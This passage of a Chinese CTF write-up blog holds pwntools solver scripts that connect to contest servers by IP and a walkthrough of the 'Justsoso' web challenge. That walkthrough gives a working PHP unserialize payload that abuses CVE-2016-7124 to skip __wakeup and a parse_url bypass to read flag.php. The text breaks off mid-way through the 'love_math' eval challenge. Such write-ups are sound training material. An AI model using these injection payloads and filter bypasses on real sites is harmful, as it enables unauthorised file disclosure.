known_whole_sha)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">                <span class="keyword">for</span> z <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">                    proof = w+x+y+z+known_part</span><br><span class="line">                    digest = sha256(proof).hexdigest()</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> digest == known_whole_sha:</span><br><span class="line">                        <span class="keyword">return</span> w+x+y+z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = pwn.remote(<span class="string">"34.92.185.118"</span>, <span class="number">10002</span>)</span><br><span class="line">sha_code = r.recvuntil(<span class="string">"Give me XXXX:"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print sha_code</span></span><br><span class="line"></span><br><span class="line">known = sha_code[sha_code.find(<span class="string">"XXXX+"</span>)+<span class="number">5</span>: sha_code.find(<span class="string">")"</span>)]</span><br><span class="line">known_sha = sha_code.split(<span class="string">'\n'</span>)[<span class="number">0</span>].split()[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print known, known_sha</span></span><br><span class="line"></span><br><span class="line">XXXX = brust_sha(known, known_sha)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendline(XXXX)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"opcode(hex): "</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"0404000235"</span>)</span><br><span class="line"></span><br><span class="line">get_flag = r.recvline()</span><br><span class="line"><span class="keyword">print</span> get_flag</span><br></pre></td></tr></table></figure></p>
<p>第二题解题脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">get_flag = <span class="string">"&gt;.&lt;"</span></span><br><span class="line"><span class="keyword">while</span> get_flag == <span class="string">"&gt;.&lt;"</span>:</span><br><span class="line">	r = pwn.remote(<span class="string">"34.92.185.118"</span>, <span class="number">10003</span>)</span><br><span class="line">	sha_code = r.recvuntil(<span class="string">"Give me XXXX:"</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">print</span> sha_code</span><br><span class="line">	</span><br><span class="line">	known = sha_code[sha_code.find(<span class="string">"XXXX+"</span>)+<span class="number">5</span>:sha_code.find(<span class="string">")"</span>)]</span><br><span class="line">	known_sha = sha_code.split(<span class="string">'\n'</span>)[<span class="number">0</span>].split()[<span class="number">-1</span>]</span><br><span class="line">	</span><br><span class="line">	XXXX = brust_sha(known, known_sha)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">print</span> XXXX </span><br><span class="line">	</span><br><span class="line">	r.sendline(XXXX)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">"opcode(hex): "</span>)</span><br><span class="line">	</span><br><span class="line">	r.sendline(<span class="string">"0004010535"</span>)</span><br><span class="line">	</span><br><span class="line">	get_flag = r.recvline(keepends = <span class="keyword">False</span>)</span><br><span class="line">	<span class="keyword">print</span> get_flag</span><br></pre></td></tr></table></figure></p>
<h2 id="0x05-Crypto-notcurves"><a href="#0x05-Crypto-notcurves" class="headerlink" title="0x05 Crypto - notcurves"></a>0x05 Crypto - notcurves</h2><p>解题脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">nc 34.85.45.159 20005</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">primeList = []</span><br><span class="line">primeDict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">14</span>,<span class="number">2</span>**<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">if</span> is_prime(i):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">20563</span> <span class="keyword">or</span> i == <span class="number">20707</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"BOM"</span></span><br><span class="line">        primeList.append(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(primeList)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(primeList)):</span><br><span class="line">        primeDict[primeList[i]*primeList[j]] = (primeList[i],primeList[j])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brust_sha</span><span class="params">(known_part, known_whole_sha)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> w <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">                <span class="keyword">for</span> z <span class="keyword">in</span> string.ascii_letters+string.digits:</span><br><span class="line">                    proof = w+x+y+z+known_part</span><br><span class="line">                    digest = sha256(proof).hexdigest()</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> digest == known_whole_sha:</span><br><span class="line">                        <span class="keyword">return</span> w+x+y+z</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="comment">#    conn = remote("0.0.0.0",20005)</span></span><br><span class="line">    conn = remote(<span class="string">"34.85.45.159"</span>,<span class="number">20005</span>)</span><br><span class="line">    sha_code = conn.recvuntil(<span class="string">"Give me XXXX:"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print sha_code</span></span><br><span class="line"></span><br><span class="line">    known = sha_code[sha_code.find(<span class="string">"XXXX+"</span>)+<span class="number">5</span>: sha_code.find(<span class="string">")"</span>)]</span><br><span class="line">    known_sha = sha_code.split(<span class="string">'\n'</span>)[<span class="number">0</span>].split()[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print known, known_sha</span></span><br><span class="line"></span><br><span class="line">    XXXX = brust_sha(known, known_sha)</span><br><span class="line">    <span class="keyword">print</span> XXXX</span><br><span class="line">    conn.sendline(XXXX)</span><br><span class="line">    </span><br><span class="line">    s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">print</span> s</span><br><span class="line">   </span><br><span class="line">    <span class="comment">#time.sleep(3)</span></span><br><span class="line">    tmpt = <span class="number">300000000</span></span><br><span class="line">    bit_label = <span class="number">8</span></span><br><span class="line">    lastNum = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> bit_label &gt;= <span class="number">0</span>:</span><br><span class="line">        s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#       print s</span></span><br><span class="line">        s = conn.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        conn.sendline(<span class="string">"4\n"</span>)</span><br><span class="line">        s = conn.recvuntil(<span class="string">'input point A: \n'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        conn.sendline(<span class="string">"(1,3)\n"</span>)</span><br><span class="line">        s = conn.recvuntil(<span class="string">'input number t: \n'</span>)</span><br><span class="line"><span class="comment">#        print s</span></span><br><span class="line">        conn.sendline(<span class="string">"%d\n"</span>%tmpt)</span><br><span class="line">        s = conn.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#        print "#",s</span></span><br><span class="line"><span class="comment">#        print s.split(':')[-1]</span></span><br><span class="line">        <span class="keyword">if</span> lastNum == <span class="string">""</span>:</span><br><span class="line">            lastNum = s.split(<span class="string">':'</span>)[<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">print</span> lastNum</span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> int(s.split(<span class="string">':'</span>)[<span class="number">-1</span>]) &lt;= int(lastNum) <span class="keyword">and</span> int(s.split(<span class="string">':'</span>)[<span class="number">-1</span>]) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> int(s.split(<span class="string">':'</span>)[<span class="number">-1</span>]) &lt; int(lastNum):</span><br><span class="line">                lastNum = s.split(<span class="string">':'</span>)[<span class="number">-1</span>]</span><br><span class="line">            tmpt += <span class="number">10</span>**bit_label</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> int(s.split(<span class="string">':'</span>)[<span class="number">-1</span>]) != <span class="number">0</span>:</span><br><span class="line">                lastNum = s.split(<span class="string">':'</span>)[<span class="number">-1</span>]</span><br><span class="line">            tmpt -= <span class="number">10</span>**bit_label</span><br><span class="line">            bit_label -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> bit_label &lt; <span class="number">0</span>:</span><br><span class="line">                tmpt += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmpt += <span class="number">10</span>**bit_label</span><br><span class="line">        <span class="keyword">print</span> tmpt</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> tmpt</span><br><span class="line">    <span class="keyword">print</span> primeDict[tmpt]</span><br><span class="line">    conn.interactive()</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
            <category> 赛后总结 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 赛后总结 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[第十二届全国大学生信息安全竞赛回顾]]></title>
      <url>/blog/public/2019/04/22/%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%9B%9E%E9%A1%BE</url>
      <content type="html"><![CDATA[<h2 id="0x00-Web-Justsoso"><a href="#0x00-Web-Justsoso" class="headerlink" title="0x00 Web - Justsoso"></a>0x00 Web - Justsoso</h2><p>题目主要涉及<code>index.php</code>和<code>hint.php</code>两个PHP文件：<br><strong>index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
<p><code>index.php</code>接收GET类型参数<code>file</code>和<code>payload</code>，并将参数值分别存入变量<code>$file</code>和<code>$payload</code>中。<code>$file</code>后来被用作文件包含<code>include</code>的参数。<code>$payload</code>则被用作反序列化<code>unserialize()</code>的参数。两个变量都需要通过正则式<code>/flag/</code>的过滤。具体反序列化产生的对象需要查看<code>hint.php</code>。<br><strong>hint.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><code>hint.php</code>中主要定义了<code>Handle</code>和<code>Flag</code>两个类。<br><code>Handle</code>类中定义了<code>__wakeup()</code>、<code>__construct($handle)</code>、<code>__destruct()</code>三个魔术函数。分别在反序列化完成时、对象构造时、对象析构时得到调用。观察到析构函数中会调用<code>$this-&gt;handle-&gt;getFlag()</code>，对应了下面<code>Flag</code>类中的<code>getFlag()</code>函数，推断<code>Flag</code>类中私有变量<code>$handle</code>实为<code>Flag</code>对象。<br><code>Flag</code>类内含<code>$file</code>、<code>$token</code>、<code>$token_flag</code>三个变量。其构造函数在接受<code>$file</code>变量的同时产生一个随机MD5值，并将该MD5赋给两个token。在<code>getFlag()</code>函数中，会为<code>token_flag</code>重新生成一个MD5值，在<code>token_flag</code>和<code>token</code>两者相同的情况下通过<code>highlight_file()</code>函数高亮显示<code>$file</code>变量指定的文件。这里我们需要显示的是<code>flag.php</code>文件的内容。<br>现在我们需要构造一个序列化字符串作为<code>$payload</code>的值，成功避过正则式<code>/flag/</code>的匹配，成功触发<code>Handle</code>类的析构函数，并在<code>Flag</code>类两个token相等的情况下读取<code>flag.php</code>的内容。<br><strong>Step 1 构造序列化字符串</strong><br>根据上面的逻辑，可以由以下<code>PHP</code>代码生成序列化字符串。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="string">'flag.php'</span>;</span><br><span class="line">$flag = <span class="keyword">new</span> Flag($file);</span><br><span class="line">$flag-&gt;token = &amp;$token_flag; <span class="comment">// 通过&amp;符取地址，使得$token中保存$token_flag的引用，从而保证两者一致。</span></span><br><span class="line"></span><br><span class="line">$handle = <span class="keyword">new</span> Handle($flag);</span><br><span class="line">$serialized_str = serialize($handle);</span><br><span class="line"><span class="keyword">echo</span> var_dump($serialized_str);</span><br></pre></td></tr></table></figure></p>
<p>最后得到序列化字符串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Handle&quot;:1:&#123;s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;token_flag&quot;;s:6:&quot;asdfdf&quot;;s:5:&quot;token&quot;;R:4;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>其中因为<code>$handle</code>为私有变量，所以序列化字符串的<code>Handle</code>和<code>handle</code>前面需要有空字节，为了绕过<code>__wakeup()</code>函数，需要将<code>&quot;Handle&quot;:</code>后面的数字1改为2(CVE-2016-7124，影响PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10)。所以最终的<code>$payload</code>值为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;token_flag&quot;;s:6:&quot;asdfdf&quot;;s:5:&quot;token&quot;;R:4;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>Step 2 规避正则式匹配</strong><br>至此我们的请求payload应该为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;token_flag&quot;;s:6:&quot;asdfdf&quot;;s:5:&quot;token&quot;;R:4;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>在经过<code>index.php</code>的<code>parse_url()</code>和<code>parse_str()</code>后，请求中的每个参数值都会经过正则式<code>\flag\</code>的匹配，因为我们要读取<code>flag.php</code>文件，且请求中有<code>token_flag</code>字符串，所以需要绕过正则匹配。这里利用的是<code>parse_url()</code>的缺陷（参考<a href="http://www.am0s.com/functions/406.html" target="_blank" rel="noopener">这里</a>），所以构造请求如下，可以使<code>parse_url()</code>返回<code>False</code>从而避开正则匹配。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target_url///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:&#123;s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;token_flag&quot;;s:6:&quot;asdfdf&quot;;s:5:&quot;token&quot;;R:4;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>关于parse_url()，可以参照<a href="http://pupiles.com/谈谈parse_url.html" target="_blank" rel="noopener">http://pupiles.com/谈谈parse_url.html</a></p>
</blockquote>
<h2 id="0x01-Web-love-math"><a href="#0x01-Web-love-math" class="headerlink" title="0x01 Web - love_math"></a>0x01 Web - love_math</h2><blockquote>
<p>参考：<a href="https://www.seanzhang.top/2019/04/21/12th_web_writeup.html" target="_blank" rel="noopener">https://www.seanzhang.top/2019/04/21/12th_web_writeup.html</a></p>
</blockquote>
<p>访问题目页面，有一个输入框接收用户输入，提交请求后返回<code>eval()</code>执行用户输入的结果。题目应该会把<code>eval()</code>执行函数限制在数学计算函数中。<br>页面含有脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(&apos;#calc&apos;).submit(function()&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:&quot;calc.php?c=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br><span class="line">            type:&apos;GET&apos;,</span><br><span class="line">            success:function(data)&#123;</span><br><span class="line">                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class="line">            &lt;/div&gt;`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:function()&#123;</span><br><span class="line">                alert(&quot;连接失败!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        return false;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>得知存在<code>calc.php</code>文件接收参数<code>c</code>进行相关数学计算。获取其源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag </span><br><span class="line">if(!isset($_GET[&apos;c&apos;]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;else&#123; </span><br><span class="line">    //例子 c=20-1 </span><br><span class="line">    $content = $_GET[&apos;c&apos;]; </span><br><span class="line">    if (strlen($content) &gt;= 80) &#123; </span><br><span class="line">        die(&quot;太长了不会算&quot;); </span><br><span class="line">    &#125; </span><br><span class="line">    $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;]; </span><br><span class="line">    foreach ($blacklist as $blackitem) &#123; </span><br><span class="line">        if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) &#123; </span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span><br><span class="line">    $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, 